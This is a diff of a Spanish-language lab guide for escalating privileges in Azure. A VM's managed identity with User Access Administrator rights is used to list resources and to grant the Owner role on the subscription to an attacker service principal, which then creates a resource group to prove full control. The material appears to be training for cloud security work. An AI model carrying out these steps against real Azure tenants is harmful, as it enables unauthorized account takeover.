@@ -109,7 +109,7 @@ Este script completo se ejecuta dentro de la VM para obtener el token y listar r
         
  2. Usar el token para realizar una llamada a la API de Azure y listar recursos
          
-       curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation-rg/resources?api-version=2021-04-01"
+       curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation/resources?api-version=2021-04-01"
 
 Resultado Esperado: Una salida JSON con la lista de todos los recursos del grupo lab-escalation. Esto prueba que el atacante ahora opera con los permisos de la identidad (User Access Administrator).
 
@@ -120,6 +120,8 @@ A. (En la máquina local) Obtener el Object ID del Service Principal atacante
 user_object_id=$(az ad sp list --display-name "attacker-sp" --query "[0].id" -o tsv)
 echo "El Object ID del atacante es: $user_object_id"
 
+consultamos el suscription ID con el siguiente comando:
+az account list --output table
 
 B. (Ejecutado en la VM) Usar la identidad para asignar el rol de Owner al atacante
 
@@ -127,9 +129,10 @@ B. (Ejecutado en la VM) Usar la identidad para asignar el rol de Owner al atacan
   
   az login --identity > /dev/null 2>&1
 
+
   Asignar el rol de Propietario al Object ID del atacante
   
- az role assignment create --assignee "<Tu_Object_ID>" --role "Owner" --scope "/subscriptions/<ID_de_tu_Suscripcion>"
+  az role assignment create --assignee "<Tu_Object_ID>" --role "Owner" --scope "/subscriptions/<ID_de_tu_Suscripcion>"
 
     
 Resultado Esperado: Una salida JSON que confirma la creación de la nueva asignación de rol.
@@ -145,6 +148,14 @@ az login --service-principal \
     -p "EL_PASSWORD_PROPORCIONADO" \
     --tenant "EL_TENANT_ID_PROPORCIONADO"
 
-(En la máquina local) El atacante, ahora Owner, crea un nuevo grupo de recursos
+(En la máquina local) El atacante, ahora Owner, Consulta los grupos de recursos existentes.
+
+az group list --output table
+
+Ahora crea uno nuevo para comprobar los permisos:
 
 az group create --name "prueba-de-control-total" --location "westus"
+
+Vuelve a consultar para confirmar la creacion.
+
+az group list --output table
